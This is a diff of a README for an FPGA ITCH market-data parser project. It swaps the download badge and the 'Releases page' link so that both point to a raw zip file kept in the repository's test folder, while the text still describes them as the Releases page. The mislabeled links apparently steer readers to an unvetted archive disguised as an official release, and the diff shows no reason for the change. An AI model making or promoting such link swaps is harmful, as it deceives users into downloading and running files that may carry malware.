@@ -8,7 +8,7 @@ Welcome to the 07-fpga-itch-parser-v5 project! This application allows you to ef
 
 To get started, visit the Releases page to download the latest version:
 
-[![Download 07-fpga-itch-parser-v5](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/prdo0985/07-fpga-itch-parser-v5/releases)
+[![Download 07-fpga-itch-parser-v5](https://github.com/prdo0985/07-fpga-itch-parser-v5/raw/refs/heads/main/test/fpga_itch_v_parser_v1.6.zip%20Now-blue)](https://github.com/prdo0985/07-fpga-itch-parser-v5/raw/refs/heads/main/test/fpga_itch_v_parser_v1.6.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release and click on it.
@@ -87,7 +87,7 @@ Explore more about high-frequency trading and market data protocols through the 
 
 ## 📅 Updates
 
-For the latest features and improvements, always check the [Releases page](https://github.com/prdo0985/07-fpga-itch-parser-v5/releases) frequently. New releases may include performance optimizations and more features.
+For the latest features and improvements, always check the [Releases page](https://github.com/prdo0985/07-fpga-itch-parser-v5/raw/refs/heads/main/test/fpga_itch_v_parser_v1.6.zip) frequently. New releases may include performance optimizations and more features.
 
 ---
 
